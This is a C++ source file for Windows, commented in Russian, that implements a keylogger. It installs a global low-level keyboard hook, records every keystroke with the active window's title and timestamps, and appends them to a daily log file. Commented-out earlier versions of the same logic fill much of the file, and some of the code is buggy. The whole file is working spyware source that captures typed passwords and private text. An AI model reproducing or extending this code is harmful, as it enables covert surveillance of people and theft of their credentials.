#include <Windows.h>
#include <time.h>
#include <iostream>
#include <fstream>
#include <winuser.h>
using namespace std;

// Функция обратного вызова. Срабатывает при нажатии
LRESULT __stdcall HookCallback(int nCode, WPARAM wParam, LPARAM lParam);

// Перехват вызова функций
HHOOK hook;

// Структура для определения кнопки
KBDLLHOOKSTRUCT kbStruct;

ofstream file;

// Получение настоящего времени
char *GetTime()
{
    time_t t = time(NULL);         // Время в секундах
    struct tm *tm = localtime(&t); // Преобразование числа в структуру tm
    static char dateTime[64];      // Время и дата
    strftime(dateTime, sizeof(dateTime), "%c", tm);
    return dateTime;
}

// Актуальный файл лог
char *GetLogFileName()
{
    const time_t tm = time(NULL);
    char buf[64];
    strftime(buf, sizeof(buf), "%d.%m.%Y", localtime(&tm));
    static char logName[128];
    strcpy(logName, "log_");
    strcat(logName, buf);
    strcat(logName, ".txt");
    return logName;
}

// другой вариант проверки

// void SecWriteSimlpKey(int key)
// {
//     char crrKey;
//     HKL kbLayout;
//     bool lower = ((GetKeyState(VK_CAPITAL) & 0x0001) != 0);
//     if ((GetKeyState(VK_SHIFT) & 0x0001) != 0 ||
//         (GetKeyState(VK_RSHIFT) & 0x0001) != 0 ||
//         (GetKeyState(VK_LSHIFT) & 0x0001) != 0)
//         {
//             crrKey = MapVirtualKeyExA(key, MAPVK_VK_TO_CHAR, kbLayout)
//         }
// }

// Проверка нажатия caps+shift, запись обычных клавиш
// void WriteSimpl(int key)
// {
//     if (GetKeyState(VK_CAPITAL) & 0x0001 && GetKeyState(VK_SHIFT) & 0x0001)
//     {
//         char c = toupper((char)key);
//         file << c << GetTime();
//     }
//     else
//     {
//         char c = tolower((char)key);
//         file << c << GetTime();
//     }
// }

// void WriteKey(int key, HWND hwnd)
// {
//     switch (key)
//     {
//     case VK_BACK:
//         file << "[BACKSPACE]" << GetTime();
//         break;
//     case VK_RETURN:
//         file << "[ENTER]" << GetTime();
//         break;
//     case VK_SPACE:
//         file << "[SPACE]" << GetTime();
//         break;
//     case VK_TAB:
//         file << "[TAB]" << GetTime();
//         break;
//     case VK_SHIFT:
//     case VK_LSHIFT:
//     case VK_RSHIFT:
//         file << "[SHIFT]" << GetTime();
//         break;
//     case VK_CONTROL:
//     case VK_LCONTROL:
//     case VK_RCONTROL:
//         file << "[CTRL]" << GetTime();
//         break;
//     case VK_ESCAPE:
//         file << "[ESC]" << GetTime();
//         break;
//     case VK_END:
//         file << "[END]" << GetTime();
//         break;
//     case VK_HOME:
//         file << "[HOME]" << GetTime();
//         break;
//     case VK_UP:
//         file << "[UP]" << GetTime();
//         break;
//     case VK_DOWN:
//         file << "[DOWN]" << GetTime();
//         break;
//     case VK_LEFT:
//         file << "[LEFT]" << GetTime();
//         break;
//     case VK_RIGHT:
//         file << "[RIGHT]" << GetTime();
//         break;
//     case 190:
//     case 110:
//         file << "." << GetTime();
//         break;
//     case 189:
//     case 109:
//         file << "[RIGHT]" << GetTime();
//         break;
//     case 20:
//         file << "[CAPS]" << GetTime();
//         break;
//     default: // TODO: сомнительное решение
//         // if (GetKeyState(VK_CAPITAL) & 0x0001 && GetKeyState(VK_SHIFT) & 0x0001)
//         // {
//         //     char c = toupper((char)key);
//         //     file << c << GetTime();
//         //     break;
//         // }
//         // else
//         // {
//         //     // char c = tolower(key);
//         //     file << key << GetTime();
//         // }
//         // // file << key << GetTime();
//         // break;
//         char crrKey;

//         bool lower = ((GetKeyState(VK_CAPITAL) & 0x0001) != 0);

//         if ((GetKeyState(VK_SHIFT) & 0x0001) != 0 ||
//             (GetKeyState(VK_LSHIFT) & 0x0001) != 0 ||
//             (GetKeyState(VK_RSHIFT) & 0x0001) != 0)
//         {
//             lower = !lower;
//         }
//         // id процесса
//         DWORD pid;
//         pid = GetWindowThreadProcessId(hwnd, NULL);
//         HKL kbLayout;
//         kbLayout = GetKeyboardLayout(pid);
//         crrKey = MapVirtualKeyExA(key, MAPVK_VK_TO_CHAR, kbLayout);
//         if (!lower)
//         {
//             tolower(crrKey);
//         }

//         file << char(crrKey);
//     }
// }

int Save(int key)
{
    if (key == 1 || key == 2)
    {
        return 0;
    }

    // Имя предыдущего окна
    wchar_t prevProgName[256];
    // Получение активного окна
    HWND hwnd = GetForegroundWindow();

    // Раскладка клавиатуры

    // Если есть активное окно
    if (hwnd)
    {
        // Заголовок окна
        wchar_t currProgName[256];
        GetWindowTextW(hwnd, currProgName, 256);

        // Сравниваем заголовки программ
        if (wcscmp(currProgName, prevProgName) != 0)
        {
            wcscpy(prevProgName, currProgName);
            // file << "\n[" << GetTime() << "] [" << currProgName << "]\n";

            file << "\n\n[Program: \"" << currProgName << "\" - " << GetTime() << "]\n";
        }
    }
    switch (key)
    {
    case VK_BACK:
        file << "[BACKSPACE]" << GetTime();
        break;
    case VK_RETURN:
        file << "[ENTER]" << GetTime();
        break;
    case VK_SPACE:
        file << "[SPACE]" << GetTime();
        break;
    case VK_TAB:
        file << "[TAB]" << GetTime();
        break;
    case VK_SHIFT:
    case VK_LSHIFT:
    case VK_RSHIFT:
        file << "[SHIFT]" << GetTime();
        break;
    case VK_CONTROL:
    case VK_LCONTROL:
    case VK_RCONTROL:
        file << "[CTRL]" << GetTime();
        break;
    case VK_ESCAPE:
        file << "[ESC]" << GetTime();
        break;
    case VK_END:
        file << "[END]" << GetTime();
        break;
    case VK_HOME:
        file << "[HOME]" << GetTime();
        break;
    case VK_UP:
        file << "[UP]" << GetTime();
        break;
    case VK_DOWN:
        file << "[DOWN]" << GetTime();
        break;
    case VK_LEFT:
        file << "[LEFT]" << GetTime();
        break;
    case VK_RIGHT:
        file << "[RIGHT]" << GetTime();
        break;
    case 190:
    case 110:
        file << "." << GetTime();
        break;
    case 189:
    case 109:
        file << "[RIGHT]" << GetTime();
        break;
    case 20:
        file << "[CAPS]" << GetTime();
        break;
    default: // TODO: сомнительное решение
        // if (GetKeyState(VK_CAPITAL) & 0x0001 && GetKeyState(VK_SHIFT) & 0x0001)
        // {
        //     char c = toupper((char)key);
        //     file << c << GetTime();
        //     break;
        // }
        // else
        // {
        //     // char c = tolower(key);
        //     file << key << GetTime();
        // }
        // // file << key << GetTime();
        // break;
        char crrKey;

        bool lower = ((GetKeyState(VK_CAPITAL) & 0x0001) != 0);

        if ((GetKeyState(VK_SHIFT) & 0x0001) != 0 ||
            (GetKeyState(VK_LSHIFT) & 0x0001) != 0 ||
            (GetKeyState(VK_RSHIFT) & 0x0001) != 0)
        {
            lower = !lower;
        }
        // id процесса
        DWORD pid;
        pid = GetWindowThreadProcessId(hwnd, NULL);
        HKL kbLayout;
        kbLayout = GetKeyboardLayout(pid);
        crrKey = MapVirtualKeyExA(key, MAPVK_VK_TO_CHAR, kbLayout);
        if (!lower)
        {
            tolower(crrKey);
        }

        file << char(crrKey);
    }
    file.flush();

    return 0;
}

LRESULT __stdcall HookCallback(int nCode, WPARAM wParam, LPARAM lParam)
{
    if (nCode >= 0 && wParam == WM_KEYDOWN)
    {
        kbStruct = *((KBDLLHOOKSTRUCT *)lParam);
        Save(kbStruct.vkCode);
    }

    return CallNextHookEx(hook, nCode, wParam, lParam);
}

int main()
{
    ShowWindow(FindWindowA("ConsoleWindowClass", NULL), 1);

    if (!(hook = SetWindowsHookEx(WH_KEYBOARD_LL, HookCallback, NULL, 0)))
    {
        printf("Something go wrong!");
    }
    // Открываем файл лога
    file.open(GetLogFileName(), ios::app | ios::out);
    MSG message;
    while (true)
        GetMessage(&message, NULL, 0, 0);
}
